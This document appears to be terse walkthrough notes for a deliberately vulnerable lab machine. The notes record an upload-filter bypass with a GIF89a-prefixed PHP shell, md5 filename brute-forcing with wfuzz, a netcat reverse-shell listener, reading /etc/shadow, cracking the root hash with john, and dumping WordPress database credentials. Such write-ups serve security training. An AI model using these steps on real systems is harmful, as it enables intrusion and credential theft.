<pre>
Enum
    Open ports:
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:c1:5c:20:9a:77:54:f8:a3:41:18:92:1b:1e:e5:35 (RSA)
|   256 df:d4:f2:61:89:61:ac:e0:ee:3b:5d:07:0d:3f:0c:87 (ECDSA)
|_  256 8b:e4:45:ab:af:c8:0e:7e:2a:e4:47:e7:52:f9:bc:71 (ED25519)
8000/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 5.0.3
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 2 disallowed entries
|_/upload.php /uploads
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blog &#8211; Just another WordPress site
MAC Address: 08:00:27:20:A9:BC (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Edit /etc/hosts:
    192.168.1.30 localhost

Enum Port 8000:
    http://192.168.1.30:8000/robots.txt
        User-agent:*
Disallow:/upload.php
Disallow:/uploads
    Upload service:
        http://192.168.1.30:8000/uploads/ -> dir for uploads
http://192.168.1.30:8000/upload.php
    Wordpress dir:
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-admin (Status: 301)
/server-status (Status: 403)

Make shell.php with in line 1:
GIF89a;

Upload.php enum:
Source code: https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php


Make make a encryption script for md5:
<?php
for ($i=1;$i<=100;$i++){
        echo md5("revshell.php".$i);
        echo "\r\n";
}

$ php cryptor.php > md5hashes


wfuzz -w md5hashes --hc 404 http://localhost:8000/uploads/FUZZ.php 
Result:
"52b584bdebbecbe48f05e83192ffb6ca"

And you put this:
http://localhost:8000/uploads/52b584bdebbecbe48f05e83192ffb6ca.php -> reverse_shell.php

rlwrap nc -nlvvp [port] 

Run reverse shell and get command line


$ python -c 'import pty; pty.spawn("/bin/bash")'
Result: 
www-data@1afdd1f6b82c:/$

Priv Esc:
    tail -c1G /etc/shadow

    Find shadow pwds
    
    Go in attacker terminal and:
        $ touch hashes
        $ vi hashes

        And add:        
    root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
daemon:*:17931:0:99999:7:::
bin:*:17931:0:99999:7:::
sys:*:17931:0:99999:7:::
sync:*:17931:0:99999:7:::
games:*:17931:0:99999:7:::
man:*:17931:0:99999:7:::
lp:*:17931:0:99999:7:::
mail:*:17931:0:99999:7:::
news:*:17931:0:99999:7:::
uucp:*:17931:0:99999:7:::
proxy:*:17931:0:99999:7:::
www-data:*:17931:0:99999:7:::
backup:*:17931:0:99999:7:::
list:*:17931:0:99999:7:::
irc:*:17931:0:99999:7:::
gnats:*:17931:0:99999:7:::
nobody:*:17931:0:99999:7:::
_apt:*:17931:0:99999:7:::
        
    Crack shadow file:
        $ john hashes    
            john             (root)
            
         $    su root 
    Password: john

    $Id 
uid=0(root) gid=0(root) groups=0(root)

    $ cd /root

    $ ls -al

    $ cat flag
        Life consists of details..

Wordpress creds:
    $ find / -name *wp-config*

    $ cat /var/www/html/wp-config.php
        /** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

        /** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'wordpress');
/** MySQL hostname */
define('DB_HOST', 'db:3306');

End##


</pre>
